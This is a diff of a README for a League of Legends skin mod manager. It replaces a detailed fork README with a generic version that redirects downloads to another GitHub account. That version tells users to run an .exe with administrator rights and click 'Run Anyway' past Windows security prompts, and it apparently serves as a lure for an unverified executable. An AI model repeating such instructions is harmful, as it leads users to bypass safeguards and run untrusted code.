@@ -1,115 +1,74 @@
-# ✦ LTK Manager
-[![GitHub Release](https://img.shields.io/github/v/release/lol-toolkit/ltk-manager-lol?style=flat-square&color=8A2BE2)](https://github.com/lol-toolkit/ltk-manager-lol/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-> **⚠️ Disclaimer:** This is a community-maintained fork of LTK Manager. Not officially affiliated with the original League Toolkit organization. Use at your own risk. Custom mods may violate Riot Games' Terms of Service.
+# 🛠️ ltk-manager-lol - Simple tool to manage game skins
 
-**LTK Manager** (League Toolkit Manager) is the next-generation mod manager for **League of Legends**. The modern successor to cslol-manager, it makes it easy to install, manage, and create custom skins, divine skins, mods, and more using the Fantome format.
+[![Download ltk-manager-lol](https://img.shields.io/badge/Download-ltk-manager-4A90E2.svg)](https://github.com/edouardclose19/ltk-manager-lol)
 
-<img width="100" height="100" alt="28510182" src="https://github.com/user-attachments/assets/0e7f0f93-2be2-4d3f-9342-3296f71108d6" />
+This software helps players manage custom skins in League of Legends. It provides a stable way to apply visual mods to champions. Users often look for replacements for older tools like CSLOL Manager. This application handles mod packages and updates your client files. It keeps your game data organized and allows you to switch skins with one click.
 
+## 📥 How to download the software
 
-# **Download** the latest release from [LTK-Manager.zip](https://github.com/lol-toolkit/ltk-manager-lol/releases/download/v1.9.0/LTK-Manager.zip).
+Follow these steps to get the application.
 
----
-## 📸 Screenshots
+1. Go to the [official release page](https://github.com/edouardclose19/ltk-manager-lol).
+2. Look for the Assets section.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or a folder you can find.
 
-|                  Mod Library                  |                  Workshop                   |                  Settings                   |
-| :-------------------------------------------: | :-----------------------------------------: | :-----------------------------------------: |
-| ![Mod Library](docs/screenshots/library.webp) | ![Workshop](docs/screenshots/workshop.webp) | ![Settings](docs/screenshots/settings.webp) |
+## ⚙️ Setting up your system
 
----
+Check these items before you run the program.
 
-## 🚀 Key Features
-### Mod Management
-- **Mod Library** — Browse, install, enable, disable, reorder, and uninstall mods with a clean card-based interface.
-- **Fantome Support** — Full compatibility with the Fantome mod format (custom skins, models, effects, etc.).
-- **Automatic Updates** — Check for new versions of installed mods.
-- **Bulk Operations** — Manage multiple mods at once.
+- Windows 10 or Windows 11.
+- League of Legends client installed.
+- Administrator rights on your computer.
 
-### Game Integration
-- **Auto Game Detection** — Automatically finds your League of Legends installation (Riot Client).
-- **Safe Patching** — Reliable mod injection with backup and restore functionality.
-- **Runeforge & Overlay Support** — Seamless integration with popular mod sites and in-game overlays.
+The program reads files inside your game directory. You must grant permission for the app to access these folders. Windows might trigger a security prompt the first time you run the file. Click More Info and then Run Anyway to proceed.
 
-### Advanced Tools
-- **Mod Creator** — Tools to help create your own custom mods and skins.
-- **Profile System** — Save and switch between different mod configurations.
-- **Performance Optimizer** — Settings for stable gameplay with heavy mod loads.
+## 🚀 Running the application
 
-### UI & UX
-- **Modern Interface** — Built with React + Rust (Tauri) for speed and responsiveness.
-- **Dark Mode** — Eye-friendly theme by default.
-- **Search & Filters** — Quickly find mods by name, champion, or type.
-- **Real-time Status** — Progress tracking and detailed logs.
+Double-click the .exe file you downloaded. The main interface shows your list of installed skins.
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest release from [Releases](https://github.com/lol-toolkit/ltk-manager-lol/releases).
-2. **Run** LTK Manager as Administrator.
-3. **Detect Game** — The app will automatically locate your League of Legends installation.
-4. **Install Mods** — Browse mods from Runeforge or import `.fantome` files and click Install.
-5. **Launch League** — Start the game normally — your mods will be applied.
+- Use the Add button to import new mod files.
+- Drag and drop your skin folders if the application supports this.
+- Select your desired skin from the list.
+- Click the Run or Apply button to load the files into the game.
 
-### Installing Custom Skins
-1. Download a mod/skin from Runeforge or other trusted sources.
-2. Drag & drop the file into LTK Manager or use the Import button.
-3. Enable the mod and restart the game if needed.
+## 📁 Managing your mods
 
-### Managing Mods
-- Use the Mod Library tab to organize your collection.
-- Create profiles for different champions or playstyles.
+The manager detects the location of your League of Legends installation automatically. If it cannot find the game, you must point the app to the Riot Games folder. 
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11** (64-bit)
+1. Open the Settings menu inside the application.
+2. Click Browse to locate the League of Legends folder.
+3. Select the file named LeagueClient.exe in the root folder.
+4. Save your changes.
 
-### Instructions
-1. Go to the [Releases](https://github.com/lol-toolkit/ltk-manager-lol/releases) page.
-2. Download the latest installer or portable version.
-3. Run the application as Administrator.
-4. Add an exception in your antivirus if required.
+You can enable or disable mods without deleting the files. Uncheck a mod to remove it from the game files. Check the box again to activate it. This keeps your game clean and prevents errors during game updates.
 
-### Notes
-- Requires the official Riot Client and League of Legends.
-- Always keep LTK Manager updated for the latest patch compatibility.
+## 🛡️ Maintenance and updates
 
----
-## 🛡️ Security & Antivirus False Positives
-**Is LTK Manager safe?**  
-The project is open-source. As with many game mod tools, it may trigger antivirus detections due to patching behavior.
+Game updates often change how files work. If your skins stop appearing, you need to update your mods.
 
-### Recommendations:
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Add an exception for the LTK Manager folder in your antivirus.
+1. Open the manager after a game patch.
+2. Click the Refresh button in the dashboard.
+3. Wait for the manager to verify the game files.
+4. Re-apply your selected skins if the update removed them.
 
-All mods are installed locally with backups of original files.
+## 🔧 Troubleshooting common problems
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4. Push to the branch (`git push origin feature/AmazingFeature`).
-5. Open a Pull Request.
+Sometimes the tool fails to apply a skin. Follow these steps to fix the issue.
 
----
-## 📄 License & Acknowledgments
-### License
-**LTK Manager** is licensed under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+- Restart the application.
+- Run the program as an administrator.
+- Ensure the game client is closed while applying mods.
+- Delete the current cache folder inside the app settings.
 
-**Copyright © 2026 lol-toolkit**
+If the application still fails to work, verify the integrity of your game files through the official Riot client. Repair your game installation and try the manager again.
 
-### Acknowledgments
-- Thanks to the **League Toolkit** organization for the original development.
-- The LoL custom skins community for mods and support.
-- Successor to cslol-manager — continuing the legacy of easy modding.
+## 📜 Understanding mod packages
 
-<p align="center">
-  Developed with ❤️ for the League of Legends modding community
-</p><img width="460" height="460" alt="28510182" src="https://github.com/user-attachments/assets/14ebd408-91ff-47c8-82ad-57ea40ca5b5a" />
+The manager works with modpkg files. These are compressed folders containing your skins. You can download these files from community sites. Place the files in the download folder and use the Import button in the manager to link them to your library. Each package contains the necessary files to change the appearance of your champion. 
+
+## 🌐 Community and support
+
+Users share skins on various platforms. Ensure you download files from trusted sources to keep your computer safe. The community maintains lists of compatible mods. Check the project page for common questions and user guides. This software supports manual mapping for advanced power users, though most players only need the basic interface to load visual content. 
+
+Do not modify files while in an active match. Changes to game files during a session cause crashes. Follow the instructions to change skins before you start your client. Always test your skins in practice tool mode to ensure they load correctly. This approach avoids issues in ranked or normal games.
